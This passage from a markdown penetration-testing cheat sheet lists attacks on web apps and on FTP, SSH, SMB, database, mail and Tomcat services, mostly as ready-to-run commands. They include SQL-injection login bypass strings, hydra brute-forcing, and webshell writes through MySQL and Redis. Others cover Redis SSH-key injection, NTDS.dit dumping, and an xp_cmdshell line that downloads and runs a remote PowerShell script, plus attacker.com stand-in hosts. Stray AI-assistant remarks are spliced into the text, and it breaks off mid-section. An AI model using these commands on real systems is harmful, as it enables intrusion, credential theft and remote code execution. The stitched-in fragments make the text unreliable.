# Testing with Burp Suite Intruder
# 1. Capture request
# 2. Send to Intruder
# 3. Mark parameter (e.g., id=1)
# 4. Use numbers 1-1000 as payload
# 5. Grep for admin, sensitive, success

# Automated IDOR testing with ffuf
ffuf -w <(seq 1 1000) -u "https://<IP>/api/user/FUZZ" -mc 200

# Grep for interesting responses
ffuf -w <(seq 1 1000) -u "https://<IP>/api/user/FUZZ" -mc 200 -mr "admin|root|password"

# Test different HTTP methods
GET /api/user/1
PUT /api/user/1
DELETE /api/user/1
PATCH /api/user/1

# Test with authenticated vs unauthenticated
# Sometimes IDOR exists only when authenticated
```

### 3.8 Authentication and Authorization Testing

```bash
# Default credentials (test common ones first)
admin:admin
admin:password
admin:Password123
root:root
root:toor

# SQL injection authentication bypass
admin'--
admin' OR '1'='1
' OR '1'='1'--
" OR "1"="1"--
admin'/*
admin' or 1=1--
admin' or 1=1#
') or '1'='1--

# Password reset vulnerabilities

## 1. Token manipulation
POST /reset-password
token=abc123&email=victim@example.com
# Try: Change email to attacker@example.com while keeping token

## 2. Host header poisoning
POST /forgot-password
Host: attacker.com
# Reset link may point to attacker.com

## 3. Token leakage in Referer
# Check if reset token is leaked in Referer header

## 4. Weak token generation
# Test if tokens are predictable (timestamp, sequential)

# Session fixation
# 1. Get session ID before login
# 2. Login with credentials
# 3. Check if session ID changes
# If not ‚Üí session fixation vulnerability

# Session hijacking
# Steal session cookie via XSS or network sniffing
# Use stolen cookie in browser

# JWT token attacks

## 1. Check for weak secrets
# Use jwt_tool or hashcat
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

## 2. Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

## 3. None algorithm attack
python3 jwt_tool.py <JWT_TOKEN> -X a

## 4. Decode and analyze
# Visit jwt.io and paste token
# Look for: user roles, expiration, issuer

## 5. Modify claims
python3 jwt_tool.py <JWT_TOKEN> -T

# Cookie manipulation
## Decode base64 cookies
echo "dXNlcjE=" | base64 -d

## Modify and re-encode
echo -n "admin" | base64

## Look for: role, user_id, is_admin, permissions

# Example vulnerable cookie
user_id=1&role=user&is_admin=false
# Modify to:
user_id=1&role=admin&is_admin=true

# OAuth vulnerabilities
## 1. Open redirect in redirect_uri
redirect_uri=https://attacker.com

## 2. CSRF in OAuth flow
# Remove state parameter

## 3. Token leakage
# Check for tokens in Referer, logs

# Two-factor authentication bypass
## 1. Try direct access after username/password
## 2. Test rate limiting on 2FA codes
## 3. Test if backup codes are weak

# Password brute force (use with caution)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Username enumeration
## Look for different responses:
## - "Invalid username"  vs "Invalid password"
## - Different response times
## - Different response lengths
```

---

## 4 Automated Scanning (Support Role)

> ‚ö†Ô∏è¬†**Important**: Automated scanners should support manual testing, not replace it. Always verify findings manually.

### 4.1 Nikto - Web Misconfiguration Scanner

```bash
# Basic scan
nikto -h https://<IP>
```

```bash
# Basic scan (output in HTML)
nikto -h https://<IP> -o nikto_<IP>.html -Format html
```

```bash
# Basic scan (output in TXT)
nikto -h https://<IP> -o nikto_<IP>.txt -Format txt
```

```bash
# Specific port scan
nikto -h https://<IP>:8080
```

```bash
# Specific port scan (output in HTML)
nikto -h https://<IP>:8080 -o nikto_8080.html -Format html
```

```bash
# SSL/TLS scan
nikto -h https://<IP> -ssl
```

```bash
# SSL/TLS scan (output in HTML)
nikto -h https://<IP>:443 -ssl -o nikto_ssl.html -Format html
```

```bash
# All tests
nikto -h https://<IP> -Tuning x  
```

```bash
# Interesting files
nikto -h https://<IP> -Tuning 1  
```

```bash
# Misconfiguration
nikto -h https://<IP> -Tuning 2  
```

```bash
# Information disclosure
nikto -h https://<IP> -Tuning 3  
```

```bash
# Injection (XSS/Script/HTML)
nikto -h https://<IP> -Tuning 4  
```

```bash
# Remote file retrieval
nikto -h https://<IP> -Tuning 5  
```

```bash
# Denial of service
nikto -h https://<IP> -Tuning 6 
```

```bash
# Remote file retrieval (server wide)
nikto -h https://<IP> -Tuning 7  
```

```bash
# Command execution / RFI
nikto -h https://<IP> -Tuning 8  
```

```bash
# SQL injection
nikto -h https://<IP> -Tuning 9  
```

```bash
# File upload
nikto -h https://<IP> -Tuning 0  
```

```bash
# Authentication bypass
nikto -h https://<IP> -Tuning a  
```

```bash
# Software identification
nikto -h https://<IP> -Tuning b  
```

```bash
# Remote source inclusion
nikto -h https://<IP> -Tuning c  
```

```bash
# Multiple tuning options
nikto -h https://<IP> -Tuning 1b3
```

```bash
# With authentication (basic auth)
nikto -h https://<IP> -id admin:password
```

```bash
# With cookie authentication
nikto -h https://<IP> -cookie "PHPSESSID=abc123; security=low"
```

```bash
# Scan multiple hosts from file
nikto -h hosts.txt -o results.html -Format html
```

```bash
# Increase timeout
nikto -h https://<IP> -timeout 10
```

```bash
# Use proxy (through Burp)
nikto -h https://<IP> -useproxy https://127.0.0.1:8080
```
```bash
# Verbose output
nikto -h https://<IP> -Display V
```

```bash
# Save results in multiple formats
nikto -h https://<IP> -o report -Format htm,txt,csv
```

**üìä What to Look For in Nikto Results:**

- ‚úÖ Outdated server/application versions with known CVEs
- ‚úÖ Directory indexing enabled
- ‚úÖ Dangerous files exposed (`/phpinfo.php`,¬†`/test.php`,¬†`/backup/`,¬†`/admin/`)
- ‚úÖ Security headers missing (X-Frame-Options, CSP, HSTS, X-XSS-Protection)
- ‚úÖ Default/sample files present
- ‚úÖ Sensitive information disclosure
- ‚úÖ Allowed HTTP methods (PUT, DELETE, TRACE)
- ‚úÖ Potentially vulnerable CGI scripts

### 4.2 Nuclei - Template-Based Vulnerability Scanning

**Installation:**

```bash
# Go installation
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Or download binary
wget https://github.com/projectdiscovery/nuclei/releases/download/v3.0.0/nuclei_3.0.0_linux_amd64.zip
unzip nuclei_3.0.0_linux_amd64.zip
chmod +x nuclei
sudo mv nuclei /usr/local/bin/

# Update templates (do this regularly)
nuclei -update-templates
nuclei -ut
```

**Usage:**

```bash
# Basic scan with all templates
nuclei -u https://<IP>/ -o nuclei_<IP>.txt
```

```bash
# Critical/High severity only
nuclei -u https://<IP>/ -severity critical,high -o nuclei_high.txt
```

```bash
# Critical/High/Medium severity only
nuclei -u https://<IP>/ -s critical,high,medium -o nuclei_medium_plus.txt
```

```bash
# Specific technology templates (Wordpress)
nuclei -u https://<IP>/ -tags wordpress -o nuclei_wordpress.txt
```

```bash
# Specific technology templates (Apache, nginx, iis)
nuclei -u https://<IP>/ -tags apache,nginx,iis -o nuclei_webservers.txt
```

```bash
# Specific technology templates (PHP, Python, Java)
nuclei -u https://<IP>/ -tags php,python,java -o nuclei_languages.txt
```

```bash
# Specific technology templates (Joomla, Drupal, Wordpress)
nuclei -u https://<IP>/ -tags joomla,drupal,wordpress -o nuclei_cms.txt
```

```bash
# CVE scanning
nuclei -u https://<IP>/ -tags cve -o nuclei_cves.txt
```

```bash
# CVE scanning (2023, 2024)
nuclei -u https://<IP>/ -tags cve2023,cve2024 -o nuclei_recent_cves.txt
```

```bash
# Specific vulnerability types: SQLi, XSS, LFI, RCE
nuclei -u https://<IP>/ -tags sqli,xss,lfi,rce -o nuclei_injection.txt
```

```bash
# Specific vulnerability types: RCE, SSRF, XXE, SSTI
nuclei -u https://<IP>/ -tags rce,ssrf,xxe,ssti -o nuclei_critical_vulns.txt
```

```bash
# Specific vulnerability types: config, exposure, misconfigurations
nuclei -u https://<IP>/ -tags config,exposure,misconfig -o nuclei_misconfig.txt
```

```bash
# Scan multiple URLs from file
nuclei -l urls.txt -o nuclei_results.txt
```

```bash
# Scan multiple URLs from file (only critical and high)
nuclei -l targets.txt -severity critical,high -o nuclei_high_all.txt
```

```bash
# With rate limiting (avoid detection/blocking) #1
nuclei -u https://<IP>/ -rate-limit 150 -bulk-size 50
```

```bash
# With rate limiting (avoid detection/blocking) #2
nuclei -u https://<IP>/ -rl 100 -bs 25 -c 10
```

```bash
# Exclude specific templates or tags (e.g., dos, fuzz, fuzzing)
nuclei -u https://<IP>/ -etags dos,fuzz,fuzzing
```

```bash
# Exclude specific templates or tags (e.g., dos)
nuclei -u https://<IP>/ -exclude-templates nuclei-templates/dos/
```

```bash
# Verbose output with matched template info
nuclei -u https://<IP>/ -v
```

```bash
# Very verbose
nuclei -u https://<IP>/ -vv  
```

```bash
# Silent mode (only results)
nuclei -u https://<IP>/ -silent
```

```bash
# JSON output for parsing
nuclei -u https://<IP>/ -json -o nuclei_results.json
```

```bash
# Markdown report
nuclei -u https://<IP>/ -markdown-export nuclei_report.md
```

```bash
# With proxy (through Burp)
nuclei -u https://<IP>/ -proxy https://127.0.0.1:8080
```

```bash
# Scan with custom header (e.g., Cookie)
nuclei -u https://<IP>/ -H "Cookie: PHPSESSID=abc123"
```

```bash
# Scan with custom header (e.g., Authorization)
nuclei -u https://<IP>/ -H "Authorization: Bearer token123"
```

```bash
# List all templates #1
nuclei -tl
```

```bash
# List all templates #2
nuclei -tags -list
```

```bash
# Update and run specific workflow
nuclei -u https://<IP>/ -w workflows/wordpress-workflow.yaml
```

```bash
# Combination of filters
nuclei -u https://<IP>/ \
  -tags cve,rce,sqli \
  -severity critical,high \
  -exclude-severity info \
  -rate-limit 100 \
  -timeout 10 \
  -retries 2 \
  -o nuclei_filtered.txt
```

**üìù Template Categories:**

```
cve          - CVE checks
exposed      - Exposed panels/services
misconfiguration - Configuration issues
technologies - Technology detection
vulnerabilities - Known vulnerabilities
default-logins - Default credentials
takeovers    - Subdomain takeovers
iot          - IoT device vulnerabilities
network      - Network service checks
```

> üîç¬†**Pro Tip**: Always manually validate Nuclei findings. False positives are common. Use Nuclei to identify potential issues, then verify manually.

### 4.3 WPScan - WordPress Vulnerability Scanner

```bash
# Basic enumeration #1
wpscan --url https://<IP>/
```

```bash
# Basic enumeration #2
wpscan --url https://<IP>/wordpress/
```

```bash
# Enumerate users
wpscan --url https://<IP>/ --enumerate u
```

```bash
# Enumerate plugins
wpscan --url https://<IP>/ --enumerate p
```

```bash
# Enumerate themes
wpscan --url https://<IP>/ --enumerate t
```

```bash
# Enumerate users, plugins, themes
wpscan --url https://<IP>/ --enumerate u,p,t
```

```bash
# Aggressive enumeration (all plugins)
wpscan --url https://<IP>/ --enumerate ap
```

```bash
# Aggressive enumeration (all themes)
wpscan --url https://<IP>/ --enumerate at
```

```bash
# Aggressive enumeration (all plugins, all themes, and users)
wpscan --url https://<IP>/ --enumerate ap,at,u
```

```bash
# Enumerate vulnerable plugins
wpscan --url https://<IP>/ --enumerate vp 
```

```bash
# Enumerate vulnerable themes
wpscan --url https://<IP>/ --enumerate vt  
```

```bash
# With API token (for vulnerability data - get free token from wpscan.com) #1
wpscan --url https://<IP>/ --api-token YOUR_TOKEN --enumerate vp,vt,u
```

```bash
# With API token (for vulnerability data - get free token from wpscan.com) #2
wpscan --url https://<IP>/ --api-token YOUR_TOKEN --enumerate ap,at,u
```

```bash
# Config backups and DB exports
wpscan --url https://<IP>/ --enumerate cb,dbe
```

```bash
# Full aggressive scan
wpscan --url https://<IP>/ --enumerate ap,at,cb,dbe,u --api-token YOUR_TOKEN
```

```bash
# Password brute force (use carefully - may lock accounts) #1
wpscan --url https://<IP>/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

```bash
# Password brute force (use carefully - may lock accounts) #2
wpscan --url https://<IP>/ --passwords passwords.txt --usernames users.txt
```

```bash
# Password brute force (use carefully - may lock accounts) #3
wpscan --url https://<IP>/ -P /usr/share/wordlists/fasttrack.txt -U admin,administrator
```

```bash
# XML-RPC brute force (faster but may be disabled)
wpscan --url https://<IP>/ --password-attack xmlrpc -U admin -P passwords.txt
```

```bash
# HTTP authentication
wpscan --url https://<IP>/ --basic-auth username:password
```

```bash
# Through proxy
wpscan --url https://<IP>/ --proxy https://127.0.0.1:8080
```

```bash
# Disable TLS verification
wpscan --url https://<IP>/ --disable-tls-checks
```

```bash
# Output to file (txt format)
wpscan --url https://<IP>/ -o wpscan_output.txt
```

```bash
# Output to file (json format)
wpscan --url https://<IP>/ --format json -o wpscan.json
```

```bash
# Enumerate timthumbs
wpscan --url https://<IP>/ --enumerate tt
```

```bash
# Enumerate media IDs
wpscan --url https://<IP>/ --enumerate m
```

```bash
# Cookie-based authentication
wpscan --url https://<IP>/ --cookie-string "wordpress_logged_in_abc123=value"
```

```bash
# Custom user agent
wpscan --url https://<IP>/ --user-agent "Mozilla/5.0"
```

```bash
# Enumerate with threads
wpscan --url https://<IP>/ --enumerate u --max-threads 50
```

```bash
# Detection modes (mixed)
wpscan --url https://<IP>/ --detection-mode mixed
```

```bash
# Detection modes (passive)
wpscan --url https://<IP>/ --detection-mode passive
```

```bash
# Detection modes (aggressive)
wpscan --url https://<IP>/ --detection-mode aggressive
```

---

## 5 Service-Specific Vulnerability Checks

### 5.1 FTP Service (Port 21)

```bash
# Anonymous access test
ftp <IP>
# Username: anonymous
# Password: anonymous (or any email)
```

```bash
# Check upload/download permissions
ftp> binary
ftp> put test.txt
ftp> ls
ftp> get test.txt
ftp> delete test.txt

# Check if you can access other directories
ftp> cd ..
ftp> cd /
ftp> ls -la
```

```bash
# Nmap NSE scripts (comprehensive FTP testing)
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 <IP>
```

```bash
# Nmap script ftp-anon
nmap --script ftp-anon -p 21 <IP>
```

```bash
# Nmap script ftp-brute
nmap --script ftp-brute -p 21 <IP> --script-args userdb=users.txt,passdb=passwords.txt
```

```bash
# Download all files recursively (if anonymous access)
wget -r ftp://anonymous:anonymous@<IP>/
```

```bash
# Download all files recursively (if anonymous access) - mirror
wget -m ftp://anonymous:anonymous@<IP>/  
```

```bash
# Using lftp (more features)
lftp <IP>
lftp> user anonymous anonymous
lftp> ls
lftp> mirror  # Download entire directory
lftp> exit
```

```bash
# Check FTP bounce attack
nmap -b anonymous:anonymous@<IP> <target_ip>
```

```bash
# Brute force FTP (use carefully) - Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
```

```bash
# Brute force FTP (use carefully) - Medusa
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

**Common FTP Vulnerabilities to Check:**

- ‚úÖ Anonymous login enabled (read/write access)
- ‚úÖ Writable web root directories (potential upload location)
- ‚úÖ Default/weak credentials
- ‚úÖ ProFTPD 1.3.3c backdoor (CVE-2010-4221)
- ‚úÖ vsftpd 3.4 backdoor (CVE-2011-2523)
- ‚úÖ FTP bounce attack capability
- ‚úÖ Unencrypted transmission (credentials in clear text)

### 5.2 SSH Service (Port 22)

```bash
# Banner grabbing (netcat) #1
nc -nv <IP> 22
```

```bash
# Banner grabbing (netcat) #2
echo "EXIT" | nc <IP> 22
```

```bash
# Banner grabbing (telnet)
telnet <IP> 22
```

```bash
# SSH version detection
ssh -V <IP>
```

```bash
# Check supported authentication methods
ssh -v <IP> 2>&1 | grep "Authentications that can continue"
```

```bash
# Check for weak algorithms and ciphers
nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <IP> -p 22
```

```bash
# Check for authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" <IP> -p 22
```

```bash
# Comprehensive SSH audit
ssh-audit <IP> -p 22
```

```bash
# SSH user enumeration (CVE-2018-15473) - timing attack
python3 ssh_user_enum.py --port 22 --userList users.txt <IP>
```

```bash
# Private key authentication
ssh -i id_rsa user@<IP>
```

```bash
# Brute force (use carefully - may lock accounts) - 1 user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
```

```bash
# Brute force (use carefully - may lock accounts) - users list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
```

```bash
# NetExec SSH - 1 user
netexec ssh <IP> -u admin -p password
```

```bash
# NetExec SSH - users list
netexec ssh <IP> -u users.txt -p passwords.txt
```

```bash
# Check for known vulnerabilities (Nmap)
nmap --script ssh-* <IP> -p 22
```

```bash
# Check for known vulnerabilities (Searchsploit)
searchsploit openssh <version>
```

**Common SSH Vulnerabilities to Check:**

- ‚úÖ Weak ciphers and algorithms (3DES, MD5, SHA1)
- ‚úÖ Password authentication enabled (instead of key-only)
- ‚úÖ Root login permitted
- ‚úÖ Default/weak credentials
- ‚úÖ User enumeration (CVE-2018-15473)
- ‚úÖ Outdated OpenSSH version with known CVEs
- ‚úÖ No rate limiting on authentication attempts

### 5.3 SMB/NetBIOS Services (Ports 139, 445)

```bash
# List shares (null session) #1
smbclient -L //<IP> -N
```

```bash
# List shares (null session) #2
smbclient -L \\\\<IP>\\ -N
```

```bash
# List shares (null session) #3
smbclient -L //<IP> -U ""
```

```bash
# List shares (with credentials) #1
smbclient -L //<IP> -U username
```

```bash
# List shares (with credentials) #2
smbclient -L //<IP> -U username%password
```

```bash
# Connect to specific share #1
smbclient //<IP>/sharename -N
```

```bash
# Connect to specific share #2
smbclient //<IP>/sharename -U username%password
```

```bash
# SMB commands once connected
smb> ls
smb> cd directory
smb> get file.txt
smb> put file.txt
smb> mget *  # Download all files
smb> prompt off  # Disable prompts for mget
smb> recurse on  # Enable recursive downloads
smb> mget *
```

```bash
# Enumerate shares with smbmap #1
smbmap -H <IP>
```

```bash
# Enumerate shares with smbmap #2
smbmap -H <IP> -u guest -p ''
```

```bash
# Enumerate shares with smbmap #3
smbmap -H <IP> -u admin -p password
```

```bash
# Enumerate shares with smbmap and recursive listing
smbmap -H <IP> -u username -p password -r  
```

```bash
# List all files recursively #1
smbmap -H <IP> -R
```

```bash
# List all files recursively #1
smbmap -H <IP> -u admin -p password -R
```

```bash
# Download specific file
smbmap -H <IP> --download 'share\file.txt'
```

```bash
# Upload file
smbmap -H <IP> --upload '/local/file.txt' 'share\file.txt'
```

```bash
# Execute command (if admin)
smbmap -H <IP> -u admin -p password -x 'whoami'
```

```bash
# enum4linux - Comprehensive SMB enumeration
enum4linux -a <IP>
```

```bash
# enum4linux - Users SMB enumeration
enum4linux -U <IP> 
```

```bash
# enum4linux - Shares SMB enumeration
enum4linux -S <IP>
```

```bash
# enum4linux - Groups SMB enumeration
enum4linux -G <IP> 
```

```bash
# enum4linux - Password policy SMB enumeration
enum4linux -P <IP> 
```

```bash
# enum4linux - OS information SMB enumeration
enum4linux -o <IP>  
```

```bash
# enum4linux - All enumeration
enum4linux -A <IP>  
```

I'll help you restructure this SMB enumeration reference guide. Here are the reformatted snippets:

```bash
# CrackMapExec - Basic SMB enumeration
crackmapexec smb <IP>
```

```bash
# CrackMapExec - Null session enumeration
crackmapexec smb <IP> -u '' -p ''
```

```bash
# CrackMapExec - Guest access enumeration
crackmapexec smb <IP> -u guest -p ''
```

```bash
# CrackMapExec - Authenticated enumeration
crackmapexec smb <IP> -u admin -p password
```

```bash
# CrackMapExec - Password spraying
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

```bash
# CrackMapExec - Enumerate shares
crackmapexec smb <IP> -u admin -p password --shares
```

```bash
# CrackMapExec - Enumerate disks
crackmapexec smb <IP> -u admin -p password --disks
```

```bash
# CrackMapExec - Enumerate sessions
crackmapexec smb <IP> -u admin -p password --sessions
```

```bash
# CrackMapExec - Enumerate users
crackmapexec smb <IP> -u admin -p password --users
```

```bash
# CrackMapExec - Enumerate groups
crackmapexec smb <IP> -u admin -p password --groups
```

```bash
# CrackMapExec - Password policy enumeration
crackmapexec smb <IP> -u admin -p password --pass-pol
```

```bash
# CrackMapExec - Command execution
crackmapexec smb <IP> -u admin -p password -x 'whoami'
```

```bash
# CrackMapExec - Spider shares module
crackmapexec smb <IP> -u admin -p password -M spider_plus
```

```bash
# CrackMapExec - Dump NTDS.dit
crackmapexec smb <IP> -u admin -p password --ntds
```

```bash
# Nmap - SMB vulnerability scanning
nmap --script smb-vuln* <IP> -p 445
```

```bash
# Nmap - SMB enumeration scripts
nmap --script smb-protocols,smb-security-mode,smb-enum-shares,smb-enum-users <IP>
```

```bash
# Nmap - EternalBlue (MS17-010) check
nmap --script smb-vuln-ms17-010 <IP>
```

```bash
# Nmap - MS08-067 vulnerability check
nmap --script smb-vuln-ms08-067 <IP>
```

```bash
# Nmap - SambaCry (CVE-2017-7494) check
nmap --script smb-vuln-cve-2017-7494 <IP>
```

```bash
# Nmap - MS10-061 vulnerability check
nmap --script smb-vuln-ms10-061 <IP>
```

```bash
# RPCclient connection
rpcclient -U "" -N <IP>
```

```bash
# RPCclient enumeration
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 0x1f4
rpcclient> getdompwinfo
rpcclient> querydispinfo
rpcclient> netshareenumall
```

```bash
# Impacket - SMB client
impacket-smbclient username:password@<IP>
```

```bash
# Impacket - SID lookup
impacket-lookupsid username:password@<IP>
```

```bash
# enum4linux - Groups SMB enumeration
enum4linux -G <IP>
```

```bash
# enum4linux - Password policy SMB enumeration
enum4linux -P <IP>
```

```bash
# enum4linux - OS information SMB enumeration
enum4linux -o <IP>
```

**Common SMB Vulnerabilities to Check:**

- ‚úÖ Null session authentication
- ‚úÖ Anonymous/guest access to shares
- ‚úÖ MS17-010 (EternalBlue) - Windows SMBv1 RCE
- ‚úÖ MS08-067 - Windows Server Service RCE
- ‚úÖ CVE-2017-7494 (SambaCry) - Samba RCE
- ‚úÖ Writable shares (potential upload location)
- ‚úÖ Sensitive files exposed in shares
- ‚úÖ Weak/default credentials
- ‚úÖ SMB signing disabled

### 5.4 Database Services

#### MySQL/MariaDB (Port 3306)

```bash
# Nmap scripts for MySQL
nmap --script mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables <IP> -p 3306
```

```bash
# Nmap mysql-enum script for MySQL
nmap --script mysql-enum <IP> -p 3306
```

```bash
# Nmap mysql-brute script for MySQL
nmap --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP> -p 3306
```

```bash
# Connect to MySQL
mysql -h <IP> -u root -p
```

```bash
# Connect to MySQL without password
mysql -h <IP> -u root 
```

```bash
# Common default credentials (root)
mysql -h <IP> -u root -p  # password: root, toor, password, mysql, [empty]
```

```bash
# Common default credentials (admin)
mysql -h <IP> -u admin -p  # password: admin, password
```

```sql
# Basic commands once connected
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;
SELECT user,password FROM mysql.user;
SELECT user,authentication_string FROM mysql.user;

# Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write files (requires FILE privilege and secure_file_priv)
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php";

# Check privileges
SHOW GRANTS;
SELECT user,host FROM mysql.user WHERE Super_priv='Y';

# UDF privilege escalation (if root access)
# Use lib_mysqludf_sys library for system command execution
```

Here's the fixed MD file with the original headings preserved:

#### MSSQL (Port 1433)

```bash
# Nmap scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config <IP> -p 1433
```
```bash
# Nmap brute force
nmap --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP> -p 1433
```
```bash
# NetExec with empty password
netexec mssql <IP> -u sa -p ''
```
```bash
# NetExec with password
netexec mssql <IP> -u sa -p password --local-auth
```
```bash
# NetExec execute command
netexec mssql <IP> -u admin -p password -x "whoami"
```
```bash
# NetExec execute query
netexec mssql <IP> -u sa -p password -q "SELECT @@version"
```
```bash
# Impacket mssqlclient with Windows auth
impacket-mssqlclient sa:password@<IP> -windows-auth
```
```bash
# Impacket mssqlclient standard auth
impacket-mssqlclient username:password@<IP>
```
```sql
# Basic queries
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;
EXEC sp_databases;
SELECT * FROM information_schema.tables;
```
```sql
# Enable xp_cmdshell (requires sysadmin role)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
```sql
# Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
```
```sql
# Execute PowerShell command
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''https://10.10.14.5/shell.ps1'')"';
```
```sql
# Read files
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';
```
```sql
# OPENROWSET for file read (may require specific permissions)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;
```
```sql
# Check current user and roles
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

#### PostgreSQL (Port 5432)

```bash
# Connect to PostgreSQL
psql -h <IP> -U postgres
```
```bash
# Connect to specific database
psql -h <IP> -U postgres -d database_name
```
```bash
# Default credentials to try
# Username: postgres, Password: postgres, password, [empty]
```
```bash
# Nmap brute force
nmap --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP> -p 5432
```
```bash
# Basic commands
\l  # List databases
\c database_name  # Connect to database
\dt  # List tables
\du  # List users/roles
\dg  # List groups
```
```sql
# SQL queries
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT * FROM pg_user;
SELECT * FROM pg_shadow;  # Password hashes (requires superuser)
```
```sql
# Read files (requires superuser)
SELECT pg_read_file('/etc/passwd', 0, 1000000);
```
```sql
# Read files using table method
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;
```
```sql
# Command execution (requires superuser)
COPY (SELECT '') TO PROGRAM 'id';
```
```sql
# Command execution using table method
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;
```
```sql
# Write files
COPY (SELECT 'test') TO '/tmp/test.txt';
```

#### Redis (Port 6379)

```bash
# Connect to Redis
redis-cli -h <IP>
```
```bash
# Connect with password
redis-cli -h <IP> -a password
```
```bash
# Using netcat
nc <IP> 6379
```
```bash
# Common commands
INFO
CONFIG GET *
KEYS *
GET key_name
SET key_name value
```
```bash
# Check authentication
AUTH password
```
```bash
# Nmap script
nmap --script redis-info <IP> -p 6379
```
```bash
# Enumerate all keys
redis-cli -h <IP> --scan
```
```bash
# List all keys
redis-cli -h <IP> KEYS "*"
```
```bash
# Write webshell (if writable web directory)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET cmd "<?php system($_GET['cmd']); ?>"
SAVE
```
```bash
# SSH key injection (if home directory writable)
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET key "\n\n\nssh-rsa YOUR_PUBLIC_KEY\n\n\n"
SAVE
```

#### MongoDB (Port 27017)

```bash
# Connect to MongoDB
mongo <IP>
```
```bash
# Connect to specific port
mongo <IP>:27017
```
```bash
# Connect to specific database
mongo <IP>/database_name
```
```bash
# With authentication
mongo -u username -p password <IP>/admin
```
```javascript
# Basic commands
show dbs
use database_name
show collections
db.collection_name.find()
db.collection_name.find().pretty()
```
```javascript
# Enumerate users
use admin
db.system.users.find()
```
```bash
# Nmap scripts
nmap --script mongodb-info,mongodb-databases <IP> -p 27017
```

### 5.5 Email Services

#### SMTP (Port 25, 587, 465)

```bash
# Banner grabbing with netcat
nc -nv <IP> 25
```
```bash
# Banner grabbing with telnet
telnet <IP> 25
```
```bash
# SMTP commands
HELO attacker.com
EHLO attacker.com
HELP
VRFY root
VRFY admin
EXPN root
```
```bash
# User enumeration with VRFY
smtp-user-enum -M VRFY -U users.txt -t <IP>
```
```bash
# User enumeration with EXPN
smtp-user-enum -M EXPN -U users.txt -t <IP>
```
```bash
# User enumeration with RCPT
smtp-user-enum -M RCPT -U users.txt -t <IP> -D example.com
```
```bash
# Nmap scripts
nmap --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 <IP> -p 25
```
```bash
# Nmap user enumeration
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <IP> -p 25
```

```bash
# Connect with telnet
telnet <IP> 25
```
```bash
# Send test email
HELO attacker.com
MAIL FROM: test@attacker.com
RCPT TO: user@<IP>
DATA
Subject: Test Email

This is a test.
.
QUIT
```
```bash
# Test open relay
swaks --to user@external.com --from sender@<IP> --server <IP>
```

#### POP3 (Port 110, 995)

```bash
# Connect with telnet
telnet <IP> 110
```
```bash
# Connect with netcat
nc -nv <IP> 110
```
```bash
# POP3 commands
USER username
PASS password
LIST  # List messages
RETR 1  # Retrieve message 1
DELE 1  # Delete message 1
QUIT
```
```bash
# Nmap scripts
nmap --script pop3-capabilities,pop3-brute <IP> -p 110
```
```bash
# Brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://<IP>
```

#### IMAP (Port 143, 993)

```bash
# Connect with telnet
telnet <IP> 143
```
```bash
# Connect with netcat
nc -nv <IP> 143
```
```bash
# IMAP commands
a1 LOGIN username password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
a5 LOGOUT
```
```bash
# Nmap scripts
nmap --script imap-capabilities,imap-brute <IP> -p 143
```
```bash
# Brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt imap://<IP>
```

## 5.6 Web Server Specific

#### Apache Tomcat (Port 8080, 8443)

```bash
# Nmap brute force
nmap --script http-tomcat-manager-brute <IP> -p 8080
```
```bash
# Nmap brute force with wordlists
nmap --script http-tomcat-manager-brute --script-args "userdb=users.txt,passdb=passwords.txt" <IP> -p 8080
```
```bash
# Metasploit auxiliary scanner
use auxiliary/scanner/http/tomcat_mgr_login
```
```bash
# Generate WAR shell
